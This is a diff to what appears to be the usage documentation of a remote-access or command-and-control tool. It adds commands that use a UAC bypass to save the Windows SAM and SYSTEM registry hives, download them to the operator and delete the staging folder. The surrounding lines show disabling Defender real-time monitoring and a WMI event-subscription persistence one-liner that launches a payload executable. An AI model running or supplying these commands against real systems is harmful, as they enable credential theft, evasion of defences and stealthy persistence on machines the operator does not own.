@@ -634,6 +634,17 @@ Commands are passed to PowerShell via `-EncodedCommand` (Base64 UTF-16LE), which
 # Disable Defender (requires elevated)
 !uacbypass Set-MpPreference -DisableRealtimeMonitoring $true
 
+# Dumping SAM
+!shell mkdir C:\temp
+
+!uacbypass reg save hklm\sam C:\temp\sam.save
+!uacbypass reg save hklm\system C:\temp\system.save
+
+!download C:/temp/system.save
+!download C:/temp/sam.save
+
+!shell Remove-Item -Recurse -Force C:\temp
+
 # WMI persistence (complex one-liner with variables, hashtables, semicolons)
 !uacbypass $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="TestFilter";EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="TestConsumer";CommandLineTemplate="C:\Users\User\payload.exe"}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}
 
